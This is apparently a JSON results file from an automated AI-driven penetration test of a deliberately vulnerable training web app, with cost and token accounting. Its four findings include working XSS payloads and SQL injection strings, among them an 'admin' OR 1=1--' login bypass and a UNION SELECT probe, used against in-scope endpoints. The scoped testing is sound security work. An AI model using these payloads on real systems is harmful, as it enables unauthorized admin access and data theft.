@@ -1,0 +1,87 @@
+{
+  "target": {
+    "name": "dvwu",
+    "type": "web",
+    "url": "https://ist-edu-bd.vercel.app/",
+    "repo_url": "https://github.com/zahidoverflow/damn-vulnerable-web-university",
+    "binary_path": null,
+    "scope_allowlist": [
+      "https://ist-edu-bd.vercel.app/",
+      "https://github.com/zahidoverflow/damn-vulnerable-web-university"
+    ]
+  },
+  "summary": {
+    "critical": 0,
+    "high": 4,
+    "medium": 0,
+    "low": 0,
+    "info": 0,
+    "total_confirmed": 4
+  },
+  "findings": [
+    {
+      "id": "6cffcad9-48c0-4338-a6f5-1d6e7cb85617",
+      "vuln_class": "XSS",
+      "affected_component": "https://ist-edu-bd.vercel.app/api/comments and https://ist-edu-bd.vercel.app/api/search",
+      "severity": "high",
+      "proof_of_concept": "1) Reflected XSS: GET https://ist-edu-bd.vercel.app/api/comments?comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E\n2) Reflected XSS: GET https://ist-edu-bd.vercel.app/api/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E\nBoth responses render the payload inside the HTML body unsanitized, so opening the URL executes JavaScript and triggers alert(1).",
+      "evidence": "Confirmed via live responses. /api/comments returned a page containing <div class=\"comment\">\n    <script>alert(1)</script>\n  </div>. /api/search returned a page containing <strong><script>alert(1)</script></strong>. Source review also shows direct template-string interpolation of user input into HTML without escaping in target/source/api/comments.js and target/source/api/search.js.",
+      "confirmed": true,
+      "solver_model": "gpt-5.4-mini",
+      "timestamp": "2026-05-18T05:16:52.731576",
+      "description": "The application reflects user-controlled input into HTML without output encoding or sanitization, enabling arbitrary JavaScript execution. This is exploitable as reflected XSS and, by code inspection, also indicates stored XSS risk in the comments handler for POST requests."
+    },
+    {
+      "id": "dddfd964-d821-482b-a324-01496b072d39",
+      "vuln_class": "sqli",
+      "affected_component": "https://ist-edu-bd.vercel.app/api/portal and https://ist-edu-bd.vercel.app/api/search",
+      "severity": "high",
+      "proof_of_concept": "1) Authentication bypass via /api/portal (GET):\n   /api/portal?username=admin'%20OR%201=1--&password=x\n   Result: HTTP 200 with 'Authentication Bypass Successful' and 'Logged in as: admin'.\n\n2) SQLi data leak via /api/search (GET):\n   /api/search?q=%27\n   Result: HTTP 200 with SQL error content and a 'Database Leak' table listing rows including admin/admin@ist.edu.bd.\n\n3) UNION-style payload also triggers the leak page:\n   /api/search?q=test'%20UNION%20SELECT%201,2,3--\n   Result: HTTP 200 with the vulnerable SQL query echoed and the same database leak table.",
+      "evidence": "Verified live responses from the target host:\n- /api/portal?username=admin'%20OR%201=1--&password=x returned a successful login page with admin details.\n- /api/search?q=%27 returned an SQL error page and a table containing sensitive user records.\n- /api/search?q=test'%20UNION%20SELECT%201,2,3-- returned the same SQL error/leak page. Source review also shows intentionally vulnerable string concatenation and hardcoded leak behavior in api/portal.js and api/search.js.",
+      "confirmed": true,
+      "solver_model": "gpt-5.4-mini",
+      "timestamp": "2026-05-18T05:16:53.300792",
+      "description": "The application exposes intentionally vulnerable SQL injection endpoints. The portal endpoint allows authentication bypass with a boolean-based payload, and the search endpoint leaks user data on SQLi-triggering input. The issue is reproducible and confirmed with live requests."
+    },
+    {
+      "id": "fd383620-31e7-4398-a6be-5acba12f3ea9",
+      "vuln_class": "auth",
+      "affected_component": "/api/portal authentication endpoint",
+      "severity": "high",
+      "proof_of_concept": "1) Send a GET request to the in-scope login endpoint with a SQLi payload in the username and any password: /api/portal?username=admin'%20OR%201%3D1--&password=x\n2) The endpoint returns HTTP 200 and an authentication-bypass success page.\n3) The response explicitly shows admin identity details (User ID 1, Username admin, Role Administrator, Email admin@ist.edu.bd), confirming privilege escalation to another user account.",
+      "evidence": "Confirmed live response from https://ist-edu-bd.vercel.app/api/portal?username=admin%27%20OR%201%3D1--&password=x returned HTTP 200 with body containing 'Authentication Bypass Successful!', 'Logged in as: Username: admin' and 'Role: Administrator'. Source code also shows vulnerable auth logic in api/portal.js / server.cjs where username input is used to trigger a bypass without real credential verification.",
+      "confirmed": true,
+      "solver_model": "gpt-5.4-mini",
+      "timestamp": "2026-05-18T05:16:53.533250",
+      "description": "The portal login endpoint is vulnerable to SQL-injection-based authentication bypass. An attacker can log in as the administrator with an arbitrary password by injecting a tautology into the username parameter, resulting in unauthorized admin access."
+    },
+    {
+      "id": "6b852273-e738-43b4-866d-f9d54ed82442",
+      "vuln_class": "Cross-Site Scripting (XSS)",
+      "affected_component": "https://ist-edu-bd.vercel.app/api/comments",
+      "severity": "high",
+      "proof_of_concept": "GET /api/comments?comment=%3Csvg%20onload%3Dalert(1)%3E",
+      "evidence": "Verified in live response: the payload is reflected unescaped inside the HTML body: <div class=\"comment\">\n    <svg onload=alert(1)>\n  </div>. This confirms reflected XSS. Source review of api/comments.js shows direct interpolation of req.query.comment into res.send() without sanitization.",
+      "confirmed": true,
+      "solver_model": "gpt-5.4-mini",
+      "timestamp": "2026-05-18T05:16:55.440326",
+      "description": "User-controlled comment input is reflected into an HTML response without output encoding, enabling script execution."
+    }
+  ],
+  "cost_summary": {
+    "total_usd": 0.0194634,
+    "cost_per_finding_usd": 0.00486585,
+    "by_model": {
+      "gpt-5.4-mini": 0.0194634
+    },
+    "by_swarm": {
+      "dvwu/xss/gpt-5.4-mini": 0.0037853999999999995,
+      "dvwu/sqli/gpt-5.4-mini": 0.0049599,
+      "dvwu/auth/gpt-5.4-mini": 0.0058491,
+      "dvwu/source/gpt-5.4-mini": 0.004869
+    },
+    "total_input_tokens": 120128,
+    "total_output_tokens": 2407,
+    "total_tokens": 122535
+  }
+}
